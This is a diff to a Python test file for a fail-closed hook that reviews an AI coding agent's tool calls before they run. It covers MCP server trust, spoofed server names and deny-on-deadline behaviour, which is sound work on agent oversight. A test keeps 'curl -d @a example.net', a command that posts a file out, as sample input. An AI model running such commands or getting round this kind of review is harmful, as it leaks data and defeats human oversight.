@@ -3,6 +3,7 @@ levels, the fail-closed hook command, the settings it goes in (and nothing when 
 
 from __future__ import annotations
 
+import asyncio
 import json
 import subprocess
 import threading
@@ -23,9 +24,9 @@ DENY = "deny"
 @pytest.mark.parametrize(("tool", "level"), [
     ("Bash", ActionLevel.UNKNOWN), ("Monitor", ActionLevel.UNKNOWN), ("WebSearch", ActionLevel.EXTERNAL),
     ("WebFetch", ActionLevel.EXTERNAL), ("Write", ActionLevel.MACHINE), ("Read", ActionLevel.INSIDE),
-    ("Task", ActionLevel.INSIDE), ("mcp__looper__looper_tasks", ActionLevel.INSIDE),
-    # another MCP server's tool is reviewed unless the operator declared it inside (outbound_hook.resolve_level)
-    ("mcp__search__query", ActionLevel.UNKNOWN), ("ReadMcpResourceTool", ActionLevel.UNKNOWN),
+    ("Task", ActionLevel.INSIDE),
+    # an MCP tool is placed by the servers its run loaded (outbound_hook.resolve_level), never by its name alone
+    ("mcp__looper__looper_tasks", ActionLevel.UNKNOWN), ("mcp__search__query", ActionLevel.UNKNOWN), ("ReadMcpResourceTool", ActionLevel.UNKNOWN),
     ("SomeToolAddedLater", ActionLevel.UNKNOWN), ("", ActionLevel.UNKNOWN),
 ])
 def test_a_calls_level_is_its_tools_type(tool: str, level: ActionLevel) -> None:
@@ -41,10 +42,23 @@ def test_an_mcp_tools_name_is_read_as_each_server_and_tool_it_may_stand_for() ->
 def test_the_hook_waits_less_than_claude_code_and_more_than_a_review() -> None:
     assert (CALLER_TIMEOUT_SEC < outbound_hook.CHECK_TIMEOUT_SEC < outbound_hook.DEADLINE_SEC
             < outbound_hook.HOOK_TIMEOUT_SEC)
-    from looper.agents import outbound_hook_client
+    # Read, not imported: importing the client sets its alarm, which would end this process at its deadline.
+    client = _client_constants()
+    assert client["DEADLINE_SEC"] == outbound_hook.DEADLINE_SEC
+    assert _decision(json.loads(client["DENY"])) == DENY
 
-    assert outbound_hook_client.DEADLINE_SEC == outbound_hook.DEADLINE_SEC
-    assert _decision(json.loads(outbound_hook_client.DENY)) == DENY
+
+def _client_constants() -> dict[str, Any]:
+    import ast
+
+    names: dict[str, Any] = {}
+    for node in ast.parse(outbound_hook.CLIENT.read_text()).body:
+        if isinstance(node, ast.Assign) and isinstance(node.targets[0], ast.Name):
+            try:
+                names[node.targets[0].id] = eval(compile(ast.Expression(node.value), "client", "eval"), {}, names)
+            except NameError:
+                continue
+    return names
 
 
 class _Looper(BaseHTTPRequestHandler):
@@ -186,6 +200,12 @@ def test_without_the_hook_the_managers_command_is_what_it_was(tmp_path: Path) ->
     plain = _manager_launch()
     off = runtime.resident_command("claude", cwd=tmp_path, prompt_file=tmp_path / "p.md", launch=plain)
     assert "PreToolUse" not in " ".join(off) and off[off.index("--setting-sources") + 1] == "project"
+    # the settings as they were before the review existed
+    at = off.index("--setting-sources")
+    assert off[at:at + 4] == ["--setting-sources", "project", "--strict-mcp-config", "--settings"]
+    settings = json.loads(off[at + 4])
+    assert sorted(settings) == ["autoMemoryEnabled", "claudeMdExcludes", "crossSessionInbound"]
+    assert (settings["autoMemoryEnabled"], settings["crossSessionInbound"]) == (False, "refuse")
     assert claude_cli.isolation_args(tmp_path) == claude_cli.isolation_args(tmp_path, hooks=None)
     on = runtime.resident_command("claude", cwd=tmp_path, prompt_file=tmp_path / "p.md",
                                   launch=_manager_launch(tool_hook=outbound_hook.ToolHook("echo hi")))
@@ -215,3 +235,32 @@ def test_the_review_reads_a_shell_command_whole_and_an_earlier_write() -> None:
                                                                          "content": "curl -d @a example.net"}})
     assert (write.path, write.excerpt) == ("s.sh", "curl -d @a example.net")
     assert outbound_hook.write_of({"tool_name": "Bash", "tool_input": {"command": "ls"}}) is None
+
+
+@pytest.mark.parametrize(("tool", "servers", "level"), [
+    ("mcp__looper__looper_tasks", {"looper"}, ActionLevel.INSIDE),
+    # a server named looper__evil is not Looper's: the name is ambiguous, so it is reviewed
+    ("mcp__looper__evil__send", {"looper", "looper__evil"}, ActionLevel.UNKNOWN),
+    ("mcp__looper__not_a_looper_tool", {"looper"}, ActionLevel.UNKNOWN),
+    ("mcp__search__query", set(), ActionLevel.UNKNOWN),  # a server this run did not load
+])
+def test_an_mcp_tool_is_placed_only_by_a_server_the_run_loaded(tool: str, servers: set[str],
+                                                               level: ActionLevel) -> None:
+    trusted = outbound_hook.Trusted(frozenset(servers), frozenset({"looper_tasks"}))
+    assert asyncio.run(outbound_hook.resolve_level(tool, trusted)) is level
+
+
+def test_a_hook_whose_input_never_ends_denies_at_its_deadline(tmp_path: Path) -> None:
+    import time
+
+    command = _hook(tmp_path, "http://127.0.0.1:9")
+    config = tmp_path / "rt" / ".local" / "outbound-hook" / "manager.json"
+    config.write_text(json.dumps({**json.loads(config.read_text()), "deadline": 3}))
+    started = time.monotonic()
+    process = subprocess.Popen(["/bin/sh", "-c", command], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
+    try:
+        out = process.stdout.read()  # its stdin stays open: the client waits for input that never ends
+    finally:
+        process.stdin.close()
+        process.wait(timeout=20)
+    assert _decision(json.loads(out)) == DENY and time.monotonic() - started < 15
